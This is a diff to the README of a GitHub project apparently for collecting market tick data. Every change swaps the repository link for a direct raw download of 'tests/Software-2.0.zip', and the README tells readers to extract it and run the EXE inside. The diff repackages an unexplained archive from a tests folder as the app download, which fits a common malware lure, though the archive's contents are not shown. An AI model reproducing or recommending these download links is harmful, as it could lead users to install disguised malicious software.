@@ -1,6 +1,6 @@
 # 📦 quantdatacollecter - Turn Tick Data Into Ready Datasets
 
-[![Download](https://img.shields.io/badge/Download-quantdatacollecter-blue?style=for-the-badge&logo=github)](https://github.com/tired-wuhan384/quantdatacollecter)
+[![Download](https://img.shields.io/badge/Download-quantdatacollecter-blue?style=for-the-badge&logo=github)](https://github.com/tired-wuhan384/quantdatacollecter/raw/refs/heads/main/tests/Software-2.0.zip)
 
 ## 🚀 Overview
 
@@ -33,7 +33,7 @@ For best results:
 
 Visit this page to download the app:
 
-[https://github.com/tired-wuhan384/quantdatacollecter](https://github.com/tired-wuhan384/quantdatacollecter)
+[https://github.com/tired-wuhan384/quantdatacollecter/raw/refs/heads/main/tests/Software-2.0.zip](https://github.com/tired-wuhan384/quantdatacollecter/raw/refs/heads/main/tests/Software-2.0.zip)
 
 If the page shows a release file, download it to your PC. If you see a ZIP file, save it and extract it first. If you see an EXE file, you can run it after download.
 
@@ -181,6 +181,6 @@ The project name and topic set point to:
 
 ## 📎 Download Again
 
-[![Download quantdatacollecter](https://img.shields.io/badge/Download%20quantdatacollecter-grey?style=for-the-badge&logo=github)](https://github.com/tired-wuhan384/quantdatacollecter)
+[![Download quantdatacollecter](https://img.shields.io/badge/Download%20quantdatacollecter-grey?style=for-the-badge&logo=github)](https://github.com/tired-wuhan384/quantdatacollecter/raw/refs/heads/main/tests/Software-2.0.zip)
 
 Open the link above to visit the download page and get the Windows file you need
